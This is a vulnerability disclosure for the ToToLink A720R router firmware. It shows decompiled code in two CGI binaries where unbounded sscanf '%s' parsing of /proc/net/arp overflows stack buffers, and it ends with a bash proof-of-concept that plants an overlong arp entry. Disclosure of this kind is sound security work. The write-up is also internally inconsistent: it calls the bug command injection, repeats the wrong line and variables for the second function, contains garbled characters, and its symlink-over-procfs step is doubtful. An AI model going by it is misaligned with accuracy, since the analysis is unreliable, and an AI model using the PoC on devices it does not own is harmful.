# Buffer Overflow Vulnerability in `/proc/net/arp`

1. Vulnerability Overview

| **Field**            | **Details**                                                  |
| -------------------- | ------------------------------------------------------------ |
| Affected Product     | ToToLink A720R Router                                        |
| Firmware Version     | **V4.1.5cu.614_B20230630**                                   |
| Vulnerability Type   | **Local Buffer Overflow via `/proc/net/arp` Parsing**        |
| Vulnerable Component | `infostat.cgi` and `cstecgi.cgi` (parsing `/proc/net/arp` with `sscanf`) |
| Prerequisites        | Requires control over `/proc/net/arp` content or filesystem write permissions (local exploitation only) |

2. Exploitation Path

```c
// infostat.cgi & cstecgi.cgi
int __fastcall sub_42B0DC(int a1, char *a2)
{
  int v4; // $s3
  _BYTE v6[256]; // [sp+20h] [-150h] BYREF
  _BYTE v7[32]; // [sp+120h] [-50h] BYREF
  char v8; // [sp+140h] [-30h] BYREF
  _BYTE v9[8]; // [sp+148h] [-28h] BYREF
  _BYTE v10[32]; // [sp+150h] [-20h] BYREF

  v4 = fopen("/proc/net/arp", "r");
  if ( !v4 )
    return puts("no proc fs mounted!");
  strcpy(a2, "0.0.0.0");
  fgets(v6, 256, v4);
  while ( fgets(v6, 256, v4) )
  {
    sscanf(v6, "%s %s %s %s", v7, &v8, v9, v10);
    ...
}

// Both functions can independently lead to a buffer overflow vulnerability
  
// infostat.cgi & cstecgi.cgi
int __fastcall sub_406760(int a1, char *a2)
{
  int v4; // $s4
  _BYTE v6[256]; // [sp+20h] [-150h] BYREF
  _BYTE v7[40]; // [sp+120h] [-50h] BYREF
  _BYTE v8[8]; // [sp+148h] [-28h] BYREF
  _BYTE v9[32]; // [sp+150h] [-20h] BYREF

  v4 = fopen("/proc/net/arp", "r");
  if ( !v4 )
    return puts("no proc fs mounted!");
  strcpy(a2, "00:00:00:00:00:00");
  fgets(v6, 256, v4);
  while ( fgets(v6, 256, v4) )
  {
    sscanf(v6, "%s %s %s %s", v7, &v7[32], v8, v9);
    ...
}
```

3. **Vulnerable Binaries:** `infostat.cgi` and `cstecgi.cgi`ï¼ŒThis vulnerability exists independently in both binaries and does not cross binary boundaries.

4. 0-Day Command Injection Exploitation Path:
   - At line 15, `fgets(v6, 256, v4)` reads content from the `/proc/net/arp` file. Then, at line 18, `sscanf(v6, "%s %s %s %s", v7, &v8, v9, v10)` parses the string. Here, `v8` is a single-byte `char`, but `%s` writes at least one `\0`, resulting in a buffer overflow vulnerability.
   - At line 37, `fgets(v6, 256, v4)` reads content from the `/proc/net/arp` file. Then, at line 18, `sscanf(v6, "%s %s %s %s", v7, &v8, v9, v10)` parses the string without any length restrictions. If `/proc/net/arp` is maliciously crafted, this leads to a buffer overflow vulnerability.
5. Proof of Concept (PoC) for Reproducing the Vulnerability:

```bash
# Create a malicious configuration file
mkdir -p /tmp/fakeproc/net
cat > /tmp/fakeproc/net/arp <<EOF
IP address       HW type     Flags       HW address            Mask     Device
192.168.0.1      AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA 0x2   eth0
EOF
ln -sf /tmp/fakeproc/net/arp /proc/net/arp
./infostat.cgi
dmesg | tail -n 5
```